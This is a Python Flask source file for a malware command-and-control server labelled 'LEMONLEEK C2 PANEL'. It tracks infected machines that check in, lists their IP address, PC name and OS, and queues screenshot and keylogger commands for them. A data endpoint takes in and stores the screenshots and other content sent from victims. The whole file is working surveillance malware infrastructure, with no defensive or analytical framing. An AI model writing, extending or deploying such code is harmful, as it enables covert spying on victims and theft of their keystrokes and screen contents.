import os
from flask import Flask, request, jsonify, render_template_string
import datetime
import base64

app = Flask(__name__)
clients = {}
commands = {}

HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Panel</title>
    <meta http-equiv="refresh" content="5">
    <style>
        body { background: #1e1e1e; color: #00ff00; font-family: monospace; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; }
        .btn { background: #00ff00; color: black; border: none; padding: 5px 10px; cursor: pointer; text-decoration: none; }
        img { max-width: 500px; border: 2px solid #00ff00; margin-top: 10px; }
    </style>
</head>
<body>
    <h1>LEMONLEEK C2 PANEL</h1>
    <h2>Active Clients: {{ count }}</h2>
    <table>
        <tr><th>ID</th><th>IP</th><th>PC Name</th><th>OS</th><th>Last Seen</th><th>Actions</th></tr>
        {% for id, info in clients.items() %}
        <tr>
            <td>{{ id }}</td>
            <td>{{ info.ip }}</td>
            <td>{{ info.pc }}</td>
            <td>{{ info.os }}</td>
            <td>{{ info.time }}</td>
            <td>
                <a href="/cmd/{{ id }}/screenshot" class="btn">Screenshot</a>
                <a href="/cmd/{{ id }}/keylogger" class="btn">Keylogger</a>
            </td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML, clients=clients, count=len(clients))

@app.route('/api/checkin', methods=['POST'])
def checkin():
    data = request.json
    cid = data.get('id')
    clients[cid] = {
        'ip': request.remote_addr,
        'pc': data.get('pc', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'time': datetime.datetime.now().strftime("%H:%M:%S")
    }
    cmd = commands.pop(cid, None)
    return jsonify({"status": "ok", "command": cmd})

@app.route('/api/data', methods=['POST'])
def get_data():
    data = request.json
    cid = data.get('id')
    if data.get('type') == 'screenshot':
        img_data = base64.b64decode(data.get('img'))
        with open(f"screenshot_{cid}.png", "wb") as f:
            f.write(img_data)
        print(f"[+] Screenshot saved for {cid}")
    else:
        print(f"[+] DATA FROM {cid}: {data.get('content')}")
    return jsonify({"status": "ok"})

@app.route('/cmd/<cid>/<action>')
def send_cmd(cid, action):
    commands[cid] = action
    return f"Command '{action}' sent to {cid}. <a href='/'>Back</a>"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
